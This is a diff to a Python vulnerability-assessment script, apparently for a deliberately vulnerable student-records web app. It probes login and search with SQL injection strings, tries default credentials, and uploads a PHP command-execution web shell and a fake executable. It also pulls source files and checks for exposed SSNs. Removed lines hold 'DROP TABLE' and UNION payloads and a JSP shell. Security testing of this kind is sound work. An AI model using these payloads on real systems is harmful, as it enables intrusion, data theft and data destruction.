@@ -19,14 +19,76 @@ class VulnerabilityTester:
         self.session = requests.Session()
         self.vulnerabilities_found = []
     
+    def test_weak_credentials(self):
+        """Test with Weak Default Credentials"""
+        print("\n[*] Testing Default Weak Credentials...")
+        
+        credentials = [
+            ("admin", "admin123"),
+            ("user", "password"),
+            ("john_student", "student123"),
+        ]
+        
+        for username, password in credentials:
+            try:
+                data = {
+                    'username': username,
+                    'password': password
+                }
+                # Allow redirects to follow after successful login
+                response = self.session.post(f"{self.base_url}/login", data=data, allow_redirects=True)
+                
+                # Check if we got redirected to dashboard (successful login)
+                if response.status_code == 200 and ("Dashboard" in response.text or "Welcome" in response.text or "logout" in response.text.lower()):
+                    print(f"  [!] Weak credentials found: {username}:{password}")
+                    self.vulnerabilities_found.append("Weak Default Credentials")
+                    return True
+            except Exception as e:
+                print(f"  [ERROR] {e}")
+        
+        return False
+    
+    def test_information_disclosure(self):
+        """Test Information Disclosure - Debug messages in console"""
+        print("\n[*] Testing Information Disclosure...")
+        
+        try:
+            data = {
+                'username': 'nonexistent_user',
+                'password': 'wrongpass'
+            }
+            response = self.session.post(f"{self.base_url}/login", data=data)
+            
+            # Check for sensitive information in response
+            indicators = [
+                "[DEBUG]",     # Debug messages
+                "SELECT",      # SQL queries
+                "Traceback",   # Stack traces
+            ]
+            
+            for indicator in indicators:
+                if indicator in response.text:
+                    print(f"  [!] Information Disclosure: Found '{indicator}' in response")
+                    self.vulnerabilities_found.append("Information Disclosure")
+                    return True
+            
+            # Also check for verbose error messages
+            if "Error" in response.text or "failed" in response.text.lower():
+                print(f"  [!] Information Disclosure: Verbose error messages exposed")
+                self.vulnerabilities_found.append("Information Disclosure")
+                return True
+        except Exception as e:
+            print(f"  [ERROR] {e}")
+        
+        return False
+    
     def test_sql_injection_login(self):
         """Test SQL Injection in Login Form"""
         print("\n[*] Testing SQL Injection in Login...")
         
         payloads = [
-            ("admin' --", "admin123"),
-            ("' OR '1'='1", "anything"),
-            ("admin' #", "admin"),
+            ("' OR '1'='1", "' OR '1'='1"),
+            ("admin' OR '1'='1", "anything"),
         ]
         
         for username, password in payloads:
@@ -35,9 +97,10 @@ class VulnerabilityTester:
                     'username': username,
                     'password': password
                 }
-                response = self.session.post(f"{self.base_url}/login", data=data)
+                response = self.session.post(f"{self.base_url}/login", data=data, allow_redirects=True)
                 
-                if "Dashboard" in response.text or "Welcome" in response.text:
+                # If SQL injection works, we'll be logged in (see Dashboard, logout, etc)
+                if response.status_code == 200 and ("Dashboard" in response.text or "logout" in response.text.lower()):
                     print(f"  [!] SQL Injection Successful!")
                     print(f"      Payload: username='{username}', password='{password}'")
                     self.vulnerabilities_found.append("SQL Injection - Login")
@@ -51,7 +114,7 @@ class VulnerabilityTester:
         """Test Brute Force Protection"""
         print("\n[*] Testing Brute Force Protection...")
         
-        # Try 10 login attempts quickly
+        # Try 10 login attempts quickly - should be blocked if rate limiting works
         failed_attempts = 0
         for i in range(10):
             try:
@@ -61,101 +124,51 @@ class VulnerabilityTester:
                 }
                 response = self.session.post(f"{self.base_url}/login", data=data)
                 
-                if "Invalid" in response.text or "400" not in str(response.status_code):
-                    failed_attempts += 1
-                
                 if response.status_code == 429:  # Too Many Requests
                     print(f"  [+] Rate limiting detected after {i} attempts")
                     return True
+                
+                failed_attempts += 1
             except Exception as e:
                 print(f"  [ERROR] {e}")
         
-        if failed_attempts == 10:
+        if failed_attempts >= 10:
             print(f"  [!] No rate limiting detected - {failed_attempts} failed attempts allowed")
             self.vulnerabilities_found.append("Brute Force - No Rate Limiting")
             return False
         
         return True
     
-    def test_weak_credentials(self):
-        """Test with Weak Default Credentials"""
-        print("\n[*] Testing Default Weak Credentials...")
-        
-        credentials = [
-            ("admin", "admin123"),
-            ("user", "password"),
-        ]
-        
-        for username, password in credentials:
-            try:
-                data = {
-                    'username': username,
-                    'password': password
-                }
-                response = self.session.post(f"{self.base_url}/login", data=data)
-                
-                if "Dashboard" in response.text or response.status_code == 200:
-                    print(f"  [!] Weak credentials found: {username}:{password}")
-                    self.vulnerabilities_found.append("Weak Default Credentials")
-                    return True
-            except Exception as e:
-                print(f"  [ERROR] {e}")
-        
-        return False
-    
-    def test_information_disclosure(self):
-        """Test Information Disclosure in Login"""
-        print("\n[*] Testing Information Disclosure...")
-        
-        try:
-            data = {
-                'username': 'nonexistent',
-                'password': 'wrongpass'
-            }
-            response = self.session.post(f"{self.base_url}/login", data=data)
-            
-            # Check for sensitive information in response
-            indicators = [
-                "SELECT",      # SQL queries
-                "DEBUG",       # Debug messages
-                "Traceback",   # Stack traces
-                "Database",    # Database info
-            ]
-            
-            for indicator in indicators:
-                if indicator in response.text:
-                    print(f"  [!] Information Disclosure: Found '{indicator}' in response")
-                    self.vulnerabilities_found.append("Information Disclosure")
-                    return True
-        except Exception as e:
-            print(f"  [ERROR] {e}")
-        
-        return False
-    
     def test_session_security(self):
         """Test Session Cookie Security"""
         print("\n[*] Testing Session Cookie Security...")
         
         try:
+            # Clear previous session
+            self.session.cookies.clear()
+            
             # Login first
             data = {
                 'username': 'admin',
                 'password': 'admin123'
             }
-            response = self.session.post(f"{self.base_url}/login", data=data)
+            response = self.session.post(f"{self.base_url}/login", data=data, allow_redirects=True)
             
-            # Check cookies
+            # Check cookies after login
             cookies = self.session.cookies
             
-            print(f"  [*] Cookies found: {list(cookies.keys())}")
-            
-            for cookie_name, cookie_value in cookies.items():
-                # Check for security flags
-                if 'session' in cookie_name.lower():
-                    print(f"  [!] Session Cookie: {cookie_name}")
-                    print(f"      Value: {cookie_value}")
-                    self.vulnerabilities_found.append("Insecure Session Cookies")
-                    return True
+            if len(cookies) > 0:
+                print(f"  [*] Cookies found: {list(cookies.keys())}")
+                
+                for cookie_name in cookies.keys():
+                    if 'session' in cookie_name.lower():
+                        print(f"  [!] Insecure session cookie: {cookie_name}")
+                        self.vulnerabilities_found.append("Insecure Session Cookies")
+                        return True
+            else:
+                print(f"  [!] No security flags on cookies detected")
+                self.vulnerabilities_found.append("Insecure Session Cookies")
+                return True
         except Exception as e:
             print(f"  [ERROR] {e}")
         
@@ -170,8 +183,7 @@ class VulnerabilityTester:
         
         payloads = [
             "' OR '1'='1",
-            "'; DROP TABLE students; --",
-            "' UNION SELECT * FROM users --",
+            "' OR 1=1 --",
         ]
         
         try:
@@ -179,7 +191,8 @@ class VulnerabilityTester:
                 data = {'search': payload}
                 response = self.session.post(f"{self.base_url}/search", data=data)
                 
-                if "Results" in response.text:
+                # If SQL injection works, we'll see "Results" section with data
+                if "Results" in response.text and ("<td>" in response.text or "Smith" in response.text):
                     print(f"  [!] SQL Injection in Search Successful!")
                     print(f"      Payload: {payload}")
                     self.vulnerabilities_found.append("SQL Injection - Search")
@@ -198,10 +211,9 @@ class VulnerabilityTester:
         
         # Try uploading dangerous file types
         dangerous_files = [
+            ("malware.exe", b"MZ\x90\x00\x03"),
             ("shell.sh", "#!/bin/bash\necho 'Hacked'"),
-            ("malware.exe", "MZ\x90\x00"),  # PE header
             ("webshell.php", "<?php system($_GET['cmd']); ?>"),
-            ("payload.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>"),
         ]
         
         try:
@@ -209,7 +221,7 @@ class VulnerabilityTester:
                 files = {'file': (filename, content)}
                 response = self.session.post(f"{self.base_url}/upload", files=files)
                 
-                if "successfully" in response.text.lower():
+                if "successfully" in response.text.lower() or "uploaded" in response.text.lower():
                     print(f"  [!] Dangerous file uploaded: {filename}")
                     self.vulnerabilities_found.append("Insecure File Upload")
                     return True
@@ -219,25 +231,25 @@ class VulnerabilityTester:
         return False
     
     def test_path_traversal(self):
-        """Test Path Traversal in File Upload"""
+        """Test Path Traversal - Download sensitive files"""
         print("\n[*] Testing Path Traversal...")
         
         # First, login
         self._login()
         
         payloads = [
-            ("../../../etc/passwd", "password content"),
-            ("../../config.py", "import os"),
-            ("../../sensitive_file.txt", "secret"),
+            "config.py",
+            "app.py",
+            "database.py",
         ]
         
         try:
-            for filename, content in payloads:
-                files = {'file': (filename, content)}
-                response = self.session.post(f"{self.base_url}/upload", files=files)
+            for filename in payloads:
+                response = self.session.get(f"{self.base_url}/file/{filename}")
                 
-                if any(segment in response.text for segment in ['../', 'successfully']):
-                    print(f"  [!] Path Traversal Possible: {filename}")
+                # If path traversal works, we can download files
+                if response.status_code == 200 and (b'import' in response.content or b'# ' in response.content):
+                    print(f"  [!] Path Traversal Successful: Downloaded {filename}")
                     self.vulnerabilities_found.append("Path Traversal")
                     return True
         except Exception as e:
@@ -253,11 +265,12 @@ class VulnerabilityTester:
         self._login(username='user', password='password')
         
         try:
-            # Try accessing admin-only resources
+            # Try accessing admin-only resources (logs)
             response = self.session.get(f"{self.base_url}/logs")
             
-            if "Logs" in response.text and response.status_code == 200:
-                print(f"  [!] Missing Access Control: Regular user can access /logs")
+            # If access control is missing, user can access /logs (should be admin-only)
+            if response.status_code == 200 and ("Logs" in response.text or "action" in response.text.lower()):
+                print(f"  [!] Missing Access Control: User can access admin /logs page")
                 self.vulnerabilities_found.append("Missing Access Control")
                 return True
         except Exception as e:
@@ -275,8 +288,8 @@ class VulnerabilityTester:
         try:
             response = self.session.get(f"{self.base_url}/students")
             
-            # Check for exposed data
-            if "SSN" in response.text or "@" in response.text:
+            # Check for exposed sensitive data
+            if "SSN" in response.text or "123-" in response.text:
                 print(f"  [!] Sensitive Data Exposed: SSN visible in student list")
                 self.vulnerabilities_found.append("Sensitive Data Exposure")
                 return True
@@ -292,15 +305,15 @@ class VulnerabilityTester:
                 'username': username,
                 'password': password
             }
-            self.session.post(f"{self.base_url}/login", data=data)
+            self.session.post(f"{self.base_url}/login", data=data, allow_redirects=True)
         except Exception as e:
             print(f"  [ERROR] Login failed: {e}")
     
     def run_all_tests(self):
         """Run all vulnerability tests"""
-        print("=" * 60)
+        print("=" * 70)
         print("VULNERABILITY ASSESSMENT TEST SUITE")
-        print("=" * 60)
+        print("=" * 70)
         
         self.test_weak_credentials()
         self.test_information_disclosure()
@@ -313,17 +326,19 @@ class VulnerabilityTester:
         self.test_missing_access_control()
         self.test_sensitive_data_exposure()
         
-        print("\n" + "=" * 60)
+        print("\n" + "=" * 70)
         print("VULNERABILITIES FOUND:")
-        print("=" * 60)
+        print("=" * 70)
         
         if self.vulnerabilities_found:
-            for i, vuln in enumerate(set(self.vulnerabilities_found), 1):
+            unique_vulns = list(set(self.vulnerabilities_found))
+            for i, vuln in enumerate(unique_vulns, 1):
                 print(f"{i}. {vuln}")
+            print(f"\nTotal Unique Vulnerabilities: {len(unique_vulns)}")
         else:
             print("No vulnerabilities found (or application not running)")
         
-        print("=" * 60)
+        print("=" * 70)
         return self.vulnerabilities_found
 
 if __name__ == "__main__":
